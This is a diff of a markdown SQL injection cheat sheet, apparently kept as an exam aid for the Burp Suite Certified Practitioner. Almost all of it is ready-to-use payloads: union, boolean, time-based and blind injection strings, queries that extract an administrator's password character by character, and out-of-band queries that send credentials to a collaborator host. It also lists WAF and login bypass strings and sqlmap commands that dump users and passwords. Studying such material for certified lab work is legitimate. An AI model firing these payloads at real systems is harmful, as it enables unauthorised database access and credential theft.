@@ -2,7 +2,7 @@
 
 ## Índice
 - [Key Terms](#key-terms)
-- [Most Important Labs](#most-important-labs)
+- [Walkthrough - Most Important Labs](#most-important-labs)
 - [Database Version](#db-type-version)
 - [Database Content](#database-content)
 - [Union Based](#union-based)
@@ -32,7 +32,7 @@
 
 ---
 
-## Most Important Labs
+## Walkthrough - Most Important Labs
 
 - [1]()
 - [2]()
@@ -44,7 +44,9 @@
 
 > ❗SQL Injection has an endless variety of payloads, bypasses, and techniques. This is my cheatsheet applied to the   BSCP, but in this case I recommend checking out the payloads from [payloads-all-the-things-sqli](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) and [portswigger-sqli](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
-### db-type-version
+<br>
+
+#### DATABAE-TYPE-VERSION
 ``` sql
 SELECT version()  --> PostgreSQL 
 SELECT @@version  --> Microsoft, MySQL
@@ -52,8 +54,7 @@ SELECT * FROM v$version  --> Oracle
 SELECT BANNER FROM v$version --> Oracle
 ```
 
-DATABASE CONTENT
-
+#### DATABASE CONTENT
 ```sql
 --- ORACLE (no information schema)
 SELECT * FROM all_tables
@@ -78,9 +79,7 @@ SELECT column_name from information_schema.columns where table_schema='foo' and 
 SELECT 1,group_concat(User,0x3a,Password),3 from mysql.user --
 
 ```
-
-UNION BASED
-
+#### UNION BASED
 ```sql
 ' UNION SELECT NULL,NULL,NULL --  null is used because it must return the same data type
 ' UNION SELECT 1,2,3 --
@@ -90,8 +89,7 @@ UNION BASED
 ' UNION SELECT group_concat(foo,bar),null --
 ```
 
-BOOLEAN BASED
-
+#### BOOLEAN BASED
 ```sql
 http://example.com/item?id=1 AND 1=1 -- except normal req
 http://example.com/item?id=1 AND 1=2 -- except error 
@@ -99,9 +97,7 @@ http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- expect no error
 http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- expect error
 ```
 
-
-TIME BASED
-
+#### TIME BASED
 ```sql
 pg_sleep(10) --> PostgreSQL
 dbms_pipe.receive_message(('a'),10) --> Oracle
@@ -111,14 +107,12 @@ SLEEP(10)  --> MySQL
 
 ```
 
-BLIND BASED
-
+#### BLIND BASED
 ```sql
 -- oracle --
 foo'||(select '' from dual)||'  -- no error
 foo'||(select '' from noexisto)||'  -- error
 foo'||(select '' from users where rownum= 1)||' -- no error? table user exists
-
 
 (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) --  true -> error
 (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) -- false -> no error
@@ -128,7 +122,6 @@ foo'||(select '' from users where rownum= 1)||' -- no error? table user exists
 
 AND 1=CAST((SELECT username FROM users ROWNUM 1) AS int)--
 
-
 SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
 SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
@@ -136,8 +129,7 @@ SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN
 
 ```
 
-
-### OUT-OF-BAND
+#### OUT-OF-BAND
 ```sql
 -- SQLI + XXE -> CHECK DNS CALLBACK
 SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<COLLAB_DOMAIN>/"> %remote;]><root>&remote;</root>'),'/l') FROM dual;
@@ -152,7 +144,7 @@ SELECT LOAD_FILE('\\\\<COLLAB_DOMAIN>\\<FILENAME>');
 SELECT username, password INTO OUTFILE '\\\\<COLLAB_DOMAIN>\\<FILENAME>';
 ```
 
-### BYPASSING-SQL-SINTAX
+#### BYPASSING-SQL-SINTAX
 ```sql
 -- BYPASSIN  EQUALS --
 
@@ -173,7 +165,8 @@ OR    --> ||
 WHERE --> HAVING
 
 ```
-WAF-AUTH-BYPASS
+
+#### WAF-AUTH-BYPASS
 ```sql
 administrator' --
 administrator' #
@@ -256,13 +249,14 @@ or 1=1/*
 
 ```
 
-SQL MAP
+#### SQL MAP
 ``` 
 sqlmap -r <REQUEST-FROM-BURP>
 
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 
 ```
+
 
 
 
